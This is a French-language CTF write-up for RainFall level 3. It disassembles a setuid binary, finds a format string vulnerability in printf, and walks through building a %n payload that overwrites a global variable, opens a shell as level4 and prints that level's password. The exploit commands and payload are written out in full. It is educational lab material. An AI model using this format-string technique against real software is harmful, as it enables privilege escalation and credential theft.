# **Level 3**

Pour le `level3` nous avons un executable, en le desassemblant dans `gdb`, on remarque qu'il utilise `printf` pour afficher l'entree de l'utilisateur sur le terminal

```
(gdb) disas main
Dump of assembler code for function main:
   0x0804851a <+0>:     push   %ebp
   0x0804851b <+1>:     mov    %esp,%ebp
   0x0804851d <+3>:     and    $0xfffffff0,%esp
   0x08048520 <+6>:     call   0x80484a4 <v>
   0x08048525 <+11>:    leave
   0x08048526 <+12>:    ret
End of assembler dump.
(gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     sub    $0x218,%esp
   0x080484ad <+9>:     mov    0x8049860,%eax
   0x080484b2 <+14>:    mov    %eax,0x8(%esp)
   0x080484b6 <+18>:    movl   $0x200,0x4(%esp)
   0x080484be <+26>:    lea    -0x208(%ebp),%eax
   0x080484c4 <+32>:    mov    %eax,(%esp)
   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:    lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:    mov    %eax,(%esp)
=> 0x080484d5 <+49>:    call   0x8048390 <printf@plt>
   0x080484da <+54>:    mov    0x804988c,%eax
   0x080484df <+59>:    cmp    $0x40,%eax
   0x080484e2 <+62>:    jne    0x8048518 <v+116>
   0x080484e4 <+64>:    mov    0x8049880,%eax
   0x080484e9 <+69>:    mov    %eax,%edx
   0x080484eb <+71>:    mov    $0x8048600,%eax
   0x080484f0 <+76>:    mov    %edx,0xc(%esp)
   0x080484f4 <+80>:    movl   $0xc,0x8(%esp)
   0x080484fc <+88>:    movl   $0x1,0x4(%esp)
   0x08048504 <+96>:    mov    %eax,(%esp)
   0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:   movl   $0x804860d,(%esp)
   0x08048513 <+111>:   call   0x80483c0 <system@plt>
   0x08048518 <+116>:   leave
   0x08048519 <+117>:   ret
End of assembler dump.
```
On remarque en lisant le code qu'il compare le contenue de l'addresse `0x804988c` à `0x40` et que si les deux valeurs sont egales, il continue sinon le programme se termine.

```
   0x080484da <+54>:    mov    0x804988c,%eax
   0x080484df <+59>:    cmp    $0x40,%eax
```


On test le programme

```
level3@RainFall:~$ ./level3
d
d
```

Tout ce passe comme prevus, on test encore

```
level3@RainFall:~$ ./level3
%x
200
```

En mettant un formatteur de string en entree, celui la est traduit pour renvoyer une valeur, cela signifie que le programme est vulnerable a ce qu'on appelle les `format string attack`

> [Format string attack](https://owasp.org/www-community/attacks/Format_string_attack)

Pour faire simple, si tu mets l'entree de l'utilisateur en premier argument a printf (ou toutes autres fonction similaire, fprintf/vprintf....)
l'utilisateur peux acceder a la memoire qui suit en mettant des formatteur de string tel que `%x` ou `%p` mais surtout il peux utiliser `%n` qui permet d'ecrire a l'addresse de l'argument passe un parametre le taille de la string deja ecrite.

Nous pouvons alors construire notre payload, pour ce faire nous avons besoin

Tout d'abord nous allons mettre en debut l'addresse que l'on veux modifier, cela permet de mettre dans la stack l'addresse pour pouvoir la dereferencer avec `%n` et ecrire dedans

```
addr = "\x8c\x98\x04\x08"
payload = addr + filler + pos
```

Maintenant il faut trouver a quelle position elle se trouve au moment du printf

```
level3@RainFall:~$ python -c 'print("\x8c\x98\x04\x08"+"%p %p %p %p %p %p")' > /var/crash/file
level3@RainFall:~$ cat /var/crash/file - | ./level3
�0x200 0xb7fd1ac0 0xb7ff37d0 0x804988c 0x25207025 0x70252070
```

On trouve quelle est a la 4eme position donc nous pouvons continuer notre payload

```
addr = "\x8c\x98\x04\x08"
pos = "%4$n"
payload = addr + filler + pos
```

Et enfin comme on veux que notre valuer soit egale a `0x40` soit `64`, on complete avec `64 - 4` caractere

```
addr = "\x8c\x98\x04\x08"
pos = "%4$n"
filler = "%60X"
payload = addr + filler + pos
```

On execute le tout

```
level3@RainFall:~$ python -c 'print("\x8c\x98\x04\x08"+"%60X%4$n")' > /var/crash/file
level3@RainFall:~$ cat /var/crash/file - | ./level3
�                                                         200
Wait what?!
id
uid=2022(level3) gid=2022(level3) euid=2025(level4) egid=100(users) groups=2025(level4),100(users),2022(level3)
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

> ### NEXT : [Level 4](/level4/resources/README.md)
